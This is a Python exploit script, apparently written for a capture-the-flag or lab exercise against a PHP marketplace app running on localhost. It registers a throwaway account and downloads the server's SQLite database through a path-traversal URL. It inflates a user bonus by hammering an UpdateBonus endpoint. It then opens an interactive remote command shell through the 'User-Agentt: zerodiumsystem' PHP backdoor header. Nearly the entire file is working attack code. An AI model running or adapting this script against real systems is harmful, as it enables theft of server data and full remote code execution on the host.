#!/usr/bin/env python3

import uuid
import sqlite3
import requests


class Farm:
    def __init__(self, host, username, password):
        self.host = host
        self.username = username
        self.password = password

        print("Created new requests session")
        self.session = requests.sessions.Session()

        self.session.post(
            f"{self.host}/register.php",
            data={"username": self.username, "password": self.password},
        )
        print(f"Registered user {(username, password)}")

        self.session.post(
            f"{self.host}/login.php",
            data={"username": self.username, "password": self.password},
        )
        print(f"Logged in {(username, password)}")

    def get_db(self):
        DBFILE = "market.db"

        resp = self.session.get(f"{self.host}/images../code/{DBFILE}")

        with open(DBFILE, mode="wb") as dbfile:
            dbfile.write(resp.content)

        return sqlite3.connect("market.db")

    def get_current_bonus(self):
        with self.get_db() as con:
            cur = con.cursor()
            query = cur.execute(
                f"SELECT bonus FROM users WHERE username=?", (self.username,)
            )
            return query.fetchone()[0]

    def update_bonus(self):
        print(f"Exploiting UpdateBonus function: ...")
        print(f"-> Bonus before: {self.get_current_bonus()}")

        for _ in range(100):
            self.session.get(
                f"{self.host}/index.php?check=UpdateBonus&username={self.username}",
            )

        print(f"-> Bonus after : {self.get_current_bonus()}")
        print(f"Exploiting UpdateBonus function: DONE")

    def rce_php(self):
        print(f"Exploiting RCE: ...")
        try:
            while True:
                cmd = input("$ ")
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                    "User-Agentt": "zerodiumsystem('" + cmd + "');",
                }
                response = self.session.get(
                    self.host, headers=headers, allow_redirects=False
                )
                current_page = response.text
                stdout = current_page.split("<!DOCTYPE html>", 1)
                print(stdout[0])
        except KeyboardInterrupt:
            print("-> Exiting...")
        print(f"Exploiting RCE: DONE")

    def start(self):
        print()
        self.update_bonus()
        print()
        self.rce_php()


if __name__ == "__main__":
    Farm(
        host="http://127.0.0.1:8080",
        username=uuid.uuid4().hex,
        password=uuid.uuid4().hex,
    ).start()
